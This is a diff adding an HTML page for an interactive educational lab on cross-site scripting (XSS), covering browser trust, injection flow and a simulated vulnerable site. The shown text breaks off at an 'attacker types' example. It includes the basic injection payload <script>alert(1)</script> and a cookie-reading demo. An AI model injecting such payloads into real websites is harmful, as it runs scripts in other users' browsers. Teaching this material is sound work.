@@ -1,0 +1,1771 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS Lab: Understanding Browser-Based Attacks</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0c10;
+  --bg2: #0f1117;
+  --bg3: #161920;
+  --bg4: #1e2128;
+  --border: #2a2d35;
+  --border2: #3a3d45;
+  --text: #e8eaf0;
+  --text2: #9ba3b2;
+  --text3: #5c6370;
+  --accent: #00d4aa;
+  --accent2: #0099ff;
+  --red: #ff4757;
+  --amber: #ffa502;
+  --green: #2ed573;
+  --purple: #a855f7;
+  --mono: 'JetBrains Mono', monospace;
+  --sans: 'Syne', sans-serif;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 16px;
+  line-height: 1.7;
+  min-height: 100vh;
+}
+
+/* NAV */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+  background: rgba(10,12,16,0.95);
+  border-bottom: 1px solid var(--border);
+  backdrop-filter: blur(8px);
+  padding: 0 2rem;
+  display: flex; align-items: center; justify-content: space-between;
+  height: 60px;
+}
+.nav-brand { font-size: 14px; font-weight: 600; color: var(--accent); font-family: var(--mono); letter-spacing: 0.05em; }
+.nav-steps { display: flex; gap: 4px; }
+.nav-step {
+  width: 28px; height: 28px; border-radius: 50%;
+  border: 1px solid var(--border2);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px; font-family: var(--mono); color: var(--text3);
+  cursor: pointer; transition: all 0.2s;
+}
+.nav-step.active { background: var(--accent); border-color: var(--accent); color: #000; font-weight: 700; }
+.nav-step.done { background: rgba(0,212,170,0.15); border-color: var(--accent); color: var(--accent); }
+.nav-step:hover { border-color: var(--accent); color: var(--accent); }
+
+/* HERO */
+.hero {
+  padding: 120px 2rem 80px;
+  max-width: 900px; margin: 0 auto; text-align: center;
+}
+.hero-badge {
+  display: inline-block;
+  font-family: var(--mono); font-size: 11px;
+  color: var(--accent); background: rgba(0,212,170,0.1);
+  border: 1px solid rgba(0,212,170,0.3);
+  padding: 4px 14px; border-radius: 20px; margin-bottom: 24px;
+  letter-spacing: 0.1em;
+}
+.hero h1 {
+  font-size: clamp(2.2rem, 5vw, 3.5rem);
+  font-weight: 800; line-height: 1.1;
+  background: linear-gradient(135deg, #e8eaf0 30%, var(--accent) 100%);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  margin-bottom: 12px;
+}
+.hero-sub { font-family: var(--mono); font-size: 14px; color: var(--accent); letter-spacing: 0.15em; margin-bottom: 20px; }
+.hero p { color: var(--text2); font-size: 17px; max-width: 600px; margin: 0 auto 40px; }
+.hero-cta {
+  display: inline-flex; align-items: center; gap: 10px;
+  background: var(--accent); color: #000;
+  font-family: var(--mono); font-size: 13px; font-weight: 700;
+  padding: 12px 28px; border-radius: 6px; border: none; cursor: pointer;
+  transition: all 0.2s; letter-spacing: 0.05em;
+}
+.hero-cta:hover { background: #00f0c0; transform: translateY(-1px); }
+.hero-stats { display: flex; justify-content: center; gap: 40px; margin-top: 50px; }
+.hero-stat { text-align: center; }
+.hero-stat-n { font-family: var(--mono); font-size: 22px; font-weight: 700; color: var(--accent); }
+.hero-stat-l { font-size: 12px; color: var(--text3); margin-top: 2px; }
+
+/* SECTIONS */
+.section {
+  max-width: 900px; margin: 0 auto 80px;
+  padding: 0 2rem;
+  display: none;
+}
+.section.active { display: block; }
+
+.section-header {
+  display: flex; align-items: flex-start; gap: 20px;
+  margin-bottom: 36px; padding-bottom: 20px;
+  border-bottom: 1px solid var(--border);
+}
+.section-num {
+  font-family: var(--mono); font-size: 11px; font-weight: 700;
+  color: var(--accent); background: rgba(0,212,170,0.1);
+  border: 1px solid rgba(0,212,170,0.25);
+  padding: 4px 10px; border-radius: 4px; white-space: nowrap;
+  margin-top: 4px;
+}
+.section-title { font-size: 1.8rem; font-weight: 800; line-height: 1.2; }
+.section-desc { color: var(--text2); font-size: 15px; margin-top: 6px; }
+
+/* CARDS */
+.card {
+  background: var(--bg3); border: 1px solid var(--border);
+  border-radius: 10px; padding: 24px;
+  margin-bottom: 20px;
+}
+.card-red { border-color: rgba(255,71,87,0.4); background: rgba(255,71,87,0.04); }
+.card-green { border-color: rgba(46,213,115,0.4); background: rgba(46,213,115,0.04); }
+.card-amber { border-color: rgba(255,165,2,0.4); background: rgba(255,165,2,0.04); }
+.card-blue { border-color: rgba(0,153,255,0.4); background: rgba(0,153,255,0.04); }
+.card-accent { border-color: rgba(0,212,170,0.4); background: rgba(0,212,170,0.04); }
+
+.card-title {
+  font-family: var(--mono); font-size: 11px; font-weight: 700;
+  letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 12px;
+}
+.card-title.red { color: var(--red); }
+.card-title.green { color: var(--green); }
+.card-title.amber { color: var(--amber); }
+.card-title.blue { color: var(--accent2); }
+.card-title.accent { color: var(--accent); }
+
+/* TERMINAL */
+.terminal {
+  background: #040608; border: 1px solid var(--border2);
+  border-radius: 8px; overflow: hidden;
+}
+.terminal-bar {
+  background: var(--bg4); padding: 8px 14px;
+  display: flex; align-items: center; gap: 8px;
+  border-bottom: 1px solid var(--border);
+}
+.term-dot { width: 10px; height: 10px; border-radius: 50%; }
+.term-dot.r { background: #ff5f57; }
+.term-dot.y { background: #ffbd2e; }
+.term-dot.g { background: #28ca41; }
+.terminal-body { padding: 16px 20px; font-family: var(--mono); font-size: 13px; line-height: 1.8; }
+.t-comment { color: var(--text3); }
+.t-key { color: var(--accent2); }
+.t-val { color: var(--accent); }
+.t-str { color: #e5c07b; }
+.t-danger { color: var(--red); }
+.t-ok { color: var(--green); }
+
+/* BUTTONS */
+.btn {
+  font-family: var(--mono); font-size: 12px; font-weight: 700;
+  padding: 8px 18px; border-radius: 5px; cursor: pointer;
+  border: 1px solid var(--border2); background: var(--bg4);
+  color: var(--text); transition: all 0.15s; letter-spacing: 0.05em;
+  display: inline-flex; align-items: center; gap: 6px;
+}
+.btn:hover { border-color: var(--accent); color: var(--accent); }
+.btn-primary { background: var(--accent); color: #000; border-color: var(--accent); }
+.btn-primary:hover { background: #00f0c0; color: #000; }
+.btn-danger { background: rgba(255,71,87,0.15); color: var(--red); border-color: rgba(255,71,87,0.4); }
+.btn-danger:hover { background: rgba(255,71,87,0.25); }
+.btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 16px; }
+
+/* INPUTS */
+input[type="text"], textarea, input[type="url"] {
+  width: 100%; background: #040608;
+  border: 1px solid var(--border2); border-radius: 6px;
+  color: var(--text); font-family: var(--mono); font-size: 13px;
+  padding: 10px 14px; outline: none; transition: border-color 0.2s;
+}
+input[type="text"]:focus, textarea:focus, input[type="url"]:focus {
+  border-color: var(--accent);
+}
+textarea { resize: vertical; min-height: 80px; }
+.input-label {
+  font-family: var(--mono); font-size: 11px; color: var(--text3);
+  margin-bottom: 6px; letter-spacing: 0.08em;
+}
+
+/* FLOW DIAGRAM */
+.flow { display: flex; align-items: center; gap: 0; flex-wrap: wrap; margin: 20px 0; }
+.flow-box {
+  background: var(--bg4); border: 1px solid var(--border2);
+  border-radius: 8px; padding: 12px 18px; font-size: 14px;
+  text-align: center; min-width: 120px;
+}
+.flow-arrow { color: var(--text3); font-size: 20px; padding: 0 8px; }
+.flow-box.highlight { border-color: var(--red); color: var(--red); background: rgba(255,71,87,0.08); }
+.flow-box.safe { border-color: var(--green); color: var(--green); background: rgba(46,213,115,0.08); }
+
+/* TABS */
+.tabs { display: flex; gap: 2px; margin-bottom: 20px; border-bottom: 1px solid var(--border); }
+.tab {
+  font-family: var(--mono); font-size: 12px; padding: 8px 16px;
+  cursor: pointer; color: var(--text3); border-bottom: 2px solid transparent;
+  margin-bottom: -1px; transition: all 0.15s; border-radius: 4px 4px 0 0;
+}
+.tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+.tab:hover:not(.active) { color: var(--text2); }
+.tab-panel { display: none; }
+.tab-panel.active { display: block; }
+
+/* SPLIT PANEL */
+.split { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+@media(max-width: 640px) { .split { grid-template-columns: 1fr; } }
+
+/* GRID 3 */
+.grid3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; }
+
+/* HIGHLIGHT */
+.hl-safe { color: var(--accent2); background: rgba(0,153,255,0.1); border-radius: 3px; padding: 0 3px; }
+.hl-danger { color: var(--red); background: rgba(255,71,87,0.12); border-radius: 3px; padding: 0 3px; font-family: var(--mono); }
+
+/* CALLOUT */
+.callout {
+  border-left: 3px solid var(--accent); background: rgba(0,212,170,0.05);
+  padding: 14px 18px; border-radius: 0 8px 8px 0; margin: 16px 0;
+  font-size: 15px;
+}
+.callout-red { border-left-color: var(--red); background: rgba(255,71,87,0.05); }
+.callout-amber { border-left-color: var(--amber); background: rgba(255,165,2,0.05); }
+
+/* PROGRESS BAR */
+.progress-bar { background: var(--border); border-radius: 10px; height: 4px; overflow: hidden; margin: 20px 0; }
+.progress-fill { height: 100%; background: var(--accent); transition: width 0.4s; border-radius: 10px; }
+
+/* BADGE */
+.badge {
+  display: inline-flex; align-items: center;
+  font-family: var(--mono); font-size: 10px; font-weight: 700;
+  padding: 3px 8px; border-radius: 3px; letter-spacing: 0.05em;
+}
+.badge-red { background: rgba(255,71,87,0.2); color: var(--red); border: 1px solid rgba(255,71,87,0.3); }
+.badge-green { background: rgba(46,213,115,0.2); color: var(--green); border: 1px solid rgba(46,213,115,0.3); }
+.badge-amber { background: rgba(255,165,2,0.2); color: var(--amber); border: 1px solid rgba(255,165,2,0.3); }
+.badge-accent { background: rgba(0,212,170,0.2); color: var(--accent); border: 1px solid rgba(0,212,170,0.3); }
+.badge-blue { background: rgba(0,153,255,0.2); color: var(--accent2); border: 1px solid rgba(0,153,255,0.3); }
+
+/* SIMULATED BROWSER */
+.sim-browser {
+  border: 1px solid var(--border2); border-radius: 10px; overflow: hidden;
+  background: var(--bg3);
+}
+.sim-bar {
+  background: var(--bg4); padding: 8px 14px;
+  display: flex; align-items: center; gap: 10px;
+  border-bottom: 1px solid var(--border);
+}
+.sim-url {
+  flex: 1; background: var(--bg); border: 1px solid var(--border2);
+  border-radius: 20px; padding: 4px 12px;
+  font-family: var(--mono); font-size: 11px; color: var(--text2);
+}
+.sim-content { padding: 20px; min-height: 80px; font-size: 15px; }
+
+/* CHECKLIST */
+.checklist { list-style: none; }
+.checklist li { display: flex; gap: 10px; align-items: flex-start; padding: 6px 0; font-size: 15px; }
+.checklist li::before { content: '→'; color: var(--accent); font-family: var(--mono); font-size: 13px; margin-top: 2px; flex-shrink: 0; }
+
+/* MINDSET PANEL */
+.mindset-item {
+  display: flex; gap: 14px; align-items: flex-start;
+  padding: 14px; background: var(--bg4); border-radius: 8px;
+  border: 1px solid var(--border); margin-bottom: 10px;
+}
+.mindset-icon { font-size: 18px; flex-shrink: 0; margin-top: 2px; }
+.mindset-q { font-weight: 600; font-size: 14px; margin-bottom: 4px; color: var(--red); }
+.mindset-a { font-size: 13px; color: var(--text2); }
+
+/* NAV BUTTONS */
+.nav-buttons {
+  display: flex; justify-content: space-between; align-items: center;
+  margin-top: 60px; padding-top: 30px; border-top: 1px solid var(--border);
+}
+
+/* LAB TASKS */
+.lab-task {
+  padding: 16px 20px; border-radius: 8px; margin-bottom: 12px;
+  border: 1px solid var(--border); background: var(--bg4);
+  display: flex; gap: 14px; align-items: flex-start; cursor: pointer;
+  transition: border-color 0.2s;
+}
+.lab-task.completed { border-color: var(--green); background: rgba(46,213,115,0.04); }
+.lab-task-num {
+  font-family: var(--mono); font-size: 20px; font-weight: 700;
+  color: var(--text3); min-width: 30px;
+}
+.lab-task.completed .lab-task-num { color: var(--green); }
+.lab-task-body {}
+.lab-task-title { font-weight: 600; margin-bottom: 4px; }
+.lab-task-hint { font-size: 13px; color: var(--text2); }
+
+/* TOOLTIP-STYLE ANNOTATION */
+.annotation {
+  font-family: var(--mono); font-size: 11px; color: var(--text3);
+  padding: 3px 8px; border: 1px dashed var(--border2); border-radius: 4px;
+  display: inline-block; margin-left: 6px;
+}
+
+/* SCAN RESULT */
+.scan-result {
+  background: var(--bg4); border: 1px solid var(--border);
+  border-radius: 8px; padding: 12px 16px; margin-top: 12px;
+  font-family: var(--mono); font-size: 12px;
+}
+.scan-line { padding: 3px 0; display: flex; gap: 10px; }
+.scan-vuln { color: var(--red); }
+.scan-safe { color: var(--green); }
+.scan-info { color: var(--accent2); }
+
+/* ALERT MODAL */
+.alert-modal-overlay {
+  display: none; position: fixed; inset: 0; z-index: 999;
+  background: rgba(0,0,0,0.8); align-items: center; justify-content: center;
+}
+.alert-modal-overlay.show { display: flex; }
+.alert-modal {
+  background: var(--bg3); border: 1px solid var(--amber);
+  border-radius: 10px; padding: 30px 36px; text-align: center;
+  max-width: 380px; width: 90%;
+}
+.alert-modal-icon { font-size: 36px; margin-bottom: 12px; }
+.alert-modal-title { font-family: var(--mono); font-size: 18px; font-weight: 700; color: var(--amber); margin-bottom: 6px; }
+.alert-modal-msg { color: var(--text2); margin-bottom: 20px; font-size: 14px; }
+.alert-modal-close {
+  font-family: var(--mono); font-size: 12px; padding: 8px 20px;
+  background: var(--bg4); border: 1px solid var(--border2); border-radius: 5px;
+  color: var(--text); cursor: pointer;
+}
+
+/* OVERVIEW CARD */
+.overview-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; margin-top: 20px; }
+.overview-card {
+  background: var(--bg3); border: 1px solid var(--border);
+  border-radius: 8px; padding: 16px; cursor: pointer;
+  transition: all 0.2s;
+}
+.overview-card:hover { border-color: var(--accent); transform: translateY(-2px); }
+.overview-card-n { font-family: var(--mono); font-size: 10px; color: var(--text3); margin-bottom: 4px; }
+.overview-card-t { font-size: 13px; font-weight: 600; }
+
+/* STORED XSS LIST */
+.comment-item {
+  padding: 10px 14px; border-radius: 6px; margin-bottom: 8px;
+  background: var(--bg4); border: 1px solid var(--border); font-size: 14px;
+}
+.comment-author { font-family: var(--mono); font-size: 10px; color: var(--text3); margin-bottom: 4px; }
+
+/* COMPARISON */
+.compare-row { display: flex; gap: 10px; margin-bottom: 10px; }
+.compare-col { flex: 1; padding: 12px; border-radius: 6px; font-size: 13px; }
+
+/* PREVENTION TABLE */
+.prev-table { width: 100%; border-collapse: collapse; }
+.prev-table th, .prev-table td { padding: 10px 14px; text-align: left; font-size: 13px; border-bottom: 1px solid var(--border); }
+.prev-table th { font-family: var(--mono); font-size: 11px; color: var(--text3); letter-spacing: 0.08em; }
+
+/* COOKIE DISPLAY */
+.cookie-display {
+  background: #040608; border: 1px solid var(--border2);
+  border-radius: 6px; padding: 10px 14px;
+  font-family: var(--mono); font-size: 12px; color: var(--accent);
+  margin: 10px 0;
+}
+
+/* Final lab output */
+#lab-output {
+  background: #040608; border: 1px solid var(--border2);
+  border-radius: 6px; padding: 14px; font-family: var(--mono); font-size: 12px;
+  min-height: 60px; color: var(--text2); white-space: pre-wrap;
+}
+</style>
+</head>
+<body>
+
+<!-- Alert Modal (safe simulation) -->
+<div class="alert-modal-overlay" id="alertModal">
+  <div class="alert-modal">
+    <div class="alert-modal-icon">⚠️</div>
+    <div class="alert-modal-title" id="alertModalTitle">JavaScript Alert</div>
+    <div class="alert-modal-msg" id="alertModalMsg">XSS</div>
+    <button class="alert-modal-close" onclick="closeAlert()">OK</button>
+  </div>
+</div>
+
+<!-- NAV -->
+<nav class="nav">
+  <div class="nav-brand">XSS_LAB v1.0</div>
+  <div class="nav-steps" id="navSteps"></div>
+</nav>
+
+<!-- HERO -->
+<div class="hero" id="heroSection">
+  <div class="hero-badge">INTERACTIVE SECURITY LAB</div>
+  <h1>XSS Lab: Understanding Browser-Based Attacks</h1>
+  <div class="hero-sub">INJECT · EXECUTE · EXPLOIT · SECURE</div>
+  <p>An interactive platform to understand how JavaScript works in browsers, how XSS happens, how attackers exploit it, and how to prevent it.</p>
+  <button class="hero-cta" onclick="startLab()">
+    <span>▶</span> START LEARNING
+  </button>
+  <div class="hero-stats">
+    <div class="hero-stat"><div class="hero-stat-n">10</div><div class="hero-stat-l">Sections</div></div>
+    <div class="hero-stat"><div class="hero-stat-n">15+</div><div class="hero-stat-l">Simulations</div></div>
+    <div class="hero-stat"><div class="hero-stat-n">5</div><div class="hero-stat-l">Lab Tasks</div></div>
+  </div>
+
+  <div class="overview-grid">
+    <div class="overview-card" onclick="goToSection(1)"><div class="overview-card-n">01</div><div class="overview-card-t">What is JavaScript</div></div>
+    <div class="overview-card" onclick="goToSection(2)"><div class="overview-card-n">02</div><div class="overview-card-t">Browser Trust Model</div></div>
+    <div class="overview-card" onclick="goToSection(3)"><div class="overview-card-n">03</div><div class="overview-card-t">What is XSS</div></div>
+    <div class="overview-card" onclick="goToSection(4)"><div class="overview-card-n">04</div><div class="overview-card-t">How XSS Happens</div></div>
+    <div class="overview-card" onclick="goToSection(5)"><div class="overview-card-n">05</div><div class="overview-card-t">Types of XSS</div></div>
+    <div class="overview-card" onclick="goToSection(6)"><div class="overview-card-n">06</div><div class="overview-card-t">Payload Execution</div></div>
+    <div class="overview-card" onclick="goToSection(7)"><div class="overview-card-n">07</div><div class="overview-card-t">Attack Scenarios</div></div>
+    <div class="overview-card" onclick="goToSection(8)"><div class="overview-card-n">08</div><div class="overview-card-t">Detection</div></div>
+    <div class="overview-card" onclick="goToSection(9)"><div class="overview-card-n">09</div><div class="overview-card-t">Prevention</div></div>
+    <div class="overview-card" onclick="goToSection(10)"><div class="overview-card-n">10</div><div class="overview-card-t">Hands-on Lab</div></div>
+  </div>
+</div>
+
+<!-- SECTION 1: JAVASCRIPT -->
+<div class="section" id="section-1">
+  <div class="section-header">
+    <div class="section-num">01 / 10</div>
+    <div><div class="section-title">What is JavaScript?</div><div class="section-desc">Understanding the language that powers the web</div></div>
+  </div>
+
+  <div class="callout">
+    JavaScript runs inside your browser and <strong>controls everything dynamic</strong> on a webpage. It can read, modify, and execute actions — all without user permission.
+  </div>
+
+  <div class="grid3" style="margin: 24px 0;">
+    <div class="card"><div class="card-title accent">WHAT IT CAN DO</div>
+      <ul class="checklist">
+        <li>Show popup alerts</li>
+        <li>Validate forms</li>
+        <li>Update page content</li>
+        <li>Read cookies &amp; storage</li>
+        <li>Make network requests</li>
+        <li>Control the entire page</li>
+      </ul>
+    </div>
+    <div class="card"><div class="card-title blue">WHERE IT RUNS</div>
+      <ul class="checklist">
+        <li>Inside your browser</li>
+        <li>Not on the server</li>
+        <li>Same as the website</li>
+        <li>Access to DOM &amp; cookies</li>
+        <li>Can read your session</li>
+      </ul>
+    </div>
+    <div class="card card-amber"><div class="card-title amber">WHY IT'S POWERFUL</div>
+      <ul class="checklist">
+        <li>Trusted by the browser</li>
+        <li>No additional prompts</li>
+        <li>Runs silently</li>
+        <li>Full page access</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title accent">TRY IT — CLICK THE BUTTONS BELOW</div>
+    <p style="font-size: 14px; color: var(--text2); margin-bottom: 16px;">These buttons trigger real JavaScript. This is exactly how scripts work on any webpage.</p>
+    <div class="btn-row">
+      <button class="btn btn-primary" onclick="simulateAlert('Hello! I am a JavaScript popup.')">▶ Show alert()</button>
+      <button class="btn" onclick="demonstrateJS('cookie')">🍪 Read document.cookie</button>
+      <button class="btn" onclick="demonstrateJS('url')">🔗 Read window.location</button>
+      <button class="btn" onclick="demonstrateJS('dom')">📄 Modify DOM</button>
+    </div>
+    <div id="js-demo-output" class="terminal" style="margin-top: 16px; display: none;">
+      <div class="terminal-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><span style="font-size:11px;color:var(--text3);margin-left:8px;">console</span></div>
+      <div class="terminal-body" id="js-demo-content"></div>
+    </div>
+  </div>
+
+  <div class="card card-blue">
+    <div class="card-title blue">KEY TAKEAWAY</div>
+    <p style="font-size: 15px;">JavaScript is <span class="hl-danger">not sandboxed</span> from the page it runs on. A script on a page can access <em>everything</em> that page has — cookies, form data, local storage, and more.</p>
+  </div>
+
+  <div class="nav-buttons">
+    <button class="btn" onclick="goHome()">← Home</button>
+    <button class="btn btn-primary" onclick="nextSection(1)">Next: Browser Trust →</button>
+  </div>
+</div>
+
+<!-- SECTION 2: BROWSER TRUST -->
+<div class="section" id="section-2">
+  <div class="section-header">
+    <div class="section-num">02 / 10</div>
+    <div><div class="section-title">How Browsers Trust JavaScript</div><div class="section-desc">The security model that XSS exploits</div></div>
+  </div>
+
+  <div class="callout">
+    The browser's rule is simple: <strong>"If a script is inside the page → execute it."</strong> The browser doesn't question where the script came from or what it does.
+  </div>
+
+  <div class="split">
+    <div class="card card-green">
+      <div class="card-title green">THE ANALOGY</div>
+      <p style="font-size: 14px; margin-bottom: 12px;">Think of a building with a security guard at the front door.</p>
+      <div style="background: var(--bg); border-radius: 8px; padding: 14px; font-size: 13px; color: var(--text2);">
+        <div style="margin-bottom: 8px;">🏢 <strong style="color: var(--text);">Building</strong> = the website</div>
+        <div style="margin-bottom: 8px;">💂 <strong style="color: var(--text);">Guard</strong> = the browser</div>
+        <div style="margin-bottom: 8px;">🧑 <strong style="color: var(--text);">Person inside</strong> = any script on the page</div>
+        <div style="margin-top: 10px; color: var(--amber);">The guard trusts anyone already inside — no matter how they got there.</div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title accent">THE TRUST RULE</div>
+      <div class="flow" style="flex-direction: column; gap: 6px;">
+        <div class="flow-box safe" style="width: 100%; text-align: left;">Script is part of the page HTML</div>
+        <div class="flow-arrow" style="transform: rotate(90deg); padding: 0;">↓</div>
+        <div class="flow-box safe" style="width: 100%; text-align: left;">Browser receives the full page</div>
+        <div class="flow-arrow" style="transform: rotate(90deg); padding: 0;">↓</div>
+        <div class="flow-box safe" style="width: 100%; text-align: left;">Browser sees &lt;script&gt; tag</div>
+        <div class="flow-arrow" style="transform: rotate(90deg); padding: 0;">↓</div>
+        <div class="flow-box highlight" style="width: 100%; text-align: left;">Executes script — no questions asked</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top: 20px;">
+    <div class="card-title accent">WHAT THE BROWSER SEES</div>
+    <div class="terminal">
+      <div class="terminal-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><span style="font-size:11px;color:var(--text3);margin-left:8px;">page source</span></div>
+      <div class="terminal-body">
+        <div class="t-comment">&lt;!-- Normal HTML (browser renders this) --&gt;</div>
+        <div>&lt;<span class="t-key">p</span>&gt;<span class="t-val">Welcome, Alice!</span>&lt;/p&gt;</div>
+        <div style="height:8px"></div>
+        <div class="t-comment">&lt;!-- Script inside the page (browser EXECUTES this) --&gt;</div>
+        <div>&lt;<span class="t-key">script</span>&gt;</div>
+        <div>&nbsp;&nbsp;<span class="t-danger">document.cookie</span> <span class="t-comment">// browser trusts this, gives full access</span></div>
+        <div>&lt;/<span class="t-key">script</span>&gt;</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card card-red" style="margin-top: 20px;">
+    <div class="card-title red">THE PROBLEM</div>
+    <p style="font-size: 14px;">The browser <strong>cannot tell</strong> the difference between:</p>
+    <div class="compare-row" style="margin-top: 12px;">
+      <div class="compare-col" style="background: rgba(46,213,115,0.08); border: 1px solid rgba(46,213,115,0.3); border-radius: 6px;">
+        <div style="color: var(--green); font-family: var(--mono); font-size: 11px; margin-bottom: 6px;">✓ LEGITIMATE</div>
+        A script the developer wrote intentionally
+      </div>
+      <div class="compare-col" style="background: rgba(255,71,87,0.08); border: 1px solid rgba(255,71,87,0.3); border-radius: 6px;">
+        <div style="color: var(--red); font-family: var(--mono); font-size: 11px; margin-bottom: 6px;">✗ INJECTED</div>
+        A script an attacker injected via user input
+      </div>
+    </div>
+  </div>
+
+  <div class="nav-buttons">
+    <button class="btn" onclick="prevSection(2)">← JavaScript</button>
+    <button class="btn btn-primary" onclick="nextSection(2)">Next: What is XSS →</button>
+  </div>
+</div>
+
+<!-- SECTION 3: WHAT IS XSS -->
+<div class="section" id="section-3">
+  <div class="section-header">
+    <div class="section-num">03 / 10</div>
+    <div><div class="section-title">What is XSS?</div><div class="section-desc">Cross-Site Scripting — the attacker's backdoor</div></div>
+  </div>
+
+  <div class="callout">
+    <strong>XSS (Cross-Site Scripting)</strong> happens when a website allows user input to become JavaScript code that executes in the browser.
+  </div>
+
+  <div class="card" style="margin: 24px 0;">
+    <div class="card-title accent">THE CORE LOGIC</div>
+    <div class="flow" style="gap: 0; align-items: center; flex-wrap: wrap;">
+      <div class="flow-box" style="background: var(--bg4);">User types input</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box" style="background: var(--bg4);">Website displays it</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box highlight">Browser executes it</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box highlight">Attack succeeds</div>
+    </div>
+  </div>
+
+  <div class="split">
+    <div class="card card-green">
+      <div class="card-title green">NORMAL BEHAVIOR</div>
+      <div style="font-size: 13px; color: var(--text2); margin-bottom: 10px;">User types text → website shows text</div>
+      <div style="background: var(--bg); border-radius: 6px; padding: 12px; font-family: var(--mono); font-size: 13px;">
+        <div>Input: <span style="color: var(--green);">"Hello World"</span></div>
+        <div>Stored: <span style="color: var(--green);">"Hello World"</span></div>
+        <div>Displayed: <span style="color: var(--green);">Hello World</span></div>
+        <div style="color: var(--green); margin-top: 8px;">✓ Safe — text is shown as text</div>
+      </div>
+    </div>
+    <div class="card card-red">
+      <div class="card-title red">XSS ATTACK</div>
+      <div style="font-size: 13px; color: var(--text2); margin-bottom: 10px;">User types script → browser runs it</div>
+      <div style="background: var(--bg); border-radius: 6px; padding: 12px; font-family: var(--mono); font-size: 13px;">
+        <div>Input: <span style="color: var(--red);">&lt;script&gt;alert(1)&lt;/script&gt;</span></div>
+        <div>Stored: <span style="color: var(--red);">&lt;script&gt;alert(1)&lt;/script&gt;</span></div>
+        <div>Executed: <span style="color: var(--red);">⚠ popup fires!</span></div>
+        <div style="color: var(--red); margin-top: 8px;">✗ Dangerous — code ran as code</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top: 20px;">
+    <div class="card-title amber">REAL-WORLD CONTEXT</div>
+    <div class="grid3">
+      <div style="padding: 12px; background: var(--bg4); border-radius: 8px; border: 1px solid var(--border);">
+        <div style="font-size: 12px; color: var(--amber); font-family: var(--mono); margin-bottom: 6px;">SEARCH BOXES</div>
+        <div style="font-size: 13px; color: var(--text2);">Search results pages reflect your input back. A vulnerable site will execute injected scripts.</div>
+      </div>
+      <div style="padding: 12px; background: var(--bg4); border-radius: 8px; border: 1px solid var(--border);">
+        <div style="font-size: 12px; color: var(--amber); font-family: var(--mono); margin-bottom: 6px;">COMMENT SECTIONS</div>
+        <div style="font-size: 13px; color: var(--text2);">Comments get stored and shown to all users. Malicious scripts attack every visitor.</div>
+      </div>
+      <div style="padding: 12px; background: var(--bg4); border-radius: 8px; border: 1px solid var(--border);">
+        <div style="font-size: 12px; color: var(--amber); font-family: var(--mono); margin-bottom: 6px;">PROFILE FIELDS</div>
+        <div style="font-size: 13px; color: var(--text2);">Username, bio, location fields — anything that gets displayed can potentially carry XSS.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="nav-buttons">
+    <button class="btn" onclick="prevSection(3)">← Browser Trust</button>
+    <button class="btn btn-primary" onclick="nextSection(3)">Next: How XSS Happens →</button>
+  </div>
+</div>
+
+<!-- SECTION 4: HOW XSS HAPPENS -->
+<div class="section" id="section-4">
+  <div class="section-header">
+    <div class="section-num">04 / 10</div>
+    <div><div class="section-title">How XSS Happens</div><div class="section-desc">Live injection simulation</div></div>
+  </div>
+
+  <div class="callout">
+    Watch what happens when a vulnerable website renders user input without sanitization. Type in the box below and see exactly how the browser handles it.
+  </div>
+
+  <div class="card">
+    <div class="card-title accent">VULNERABLE WEBSITE SIMULATION</div>
+    <p style="font-size: 13px; color: var(--text2); margin-bottom: 14px;">This simulates a website that takes user input and renders it directly in the page. Try both inputs below:</p>
+
+    <div class="tabs" id="s4tabs">
+      <div class="tab active" onclick="s4tab(0)">Normal Input</div>
+      <div class="tab" onclick="s4tab(1)">Attack Input</div>
+      <div class="tab" onclick="s4tab(2)">Try Your Own</div>
+    </div>
+
+    <div class="tab-panel active" id="s4p0">
+      <div class="input-label">USER TYPES:</div>
+      <div style="background: #040608; border: 1px solid var(--border2); border-radius: 6px; padding: 10px 14px; font-family: var(--mono); font-size: 13px; color: var(--green); margin-bottom: 14px;">Hello, my name is Alice</div>
+      <div class="input-label">WEBSITE RENDERS (HTML):</div>
+      <div class="terminal">
+        <div class="terminal-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><span style="font-size:11px;color:var(--text3);margin-left:8px;">rendered HTML</span></div>
+        <div class="terminal-body">&lt;<span class="t-key">div</span>&gt;<span class="t-val">Hello, my name is Alice</span>&lt;/<span class="t-key">div</span>&gt;</div>
+      </div>
+      <div style="margin-top: 14px;">
+        <div class="input-label">RESULT IN BROWSER:</div>
+        <div class="sim-browser">
+          <div class="sim-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><div class="sim-url">https://example.com/profile</div></div>
+          <div class="sim-content"><span class="hl-safe">Hello, my name is Alice</span> <span class="annotation">text rendered safely</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="tab-panel" id="s4p1">
+      <div class="input-label">ATTACKER TYPES:</div>
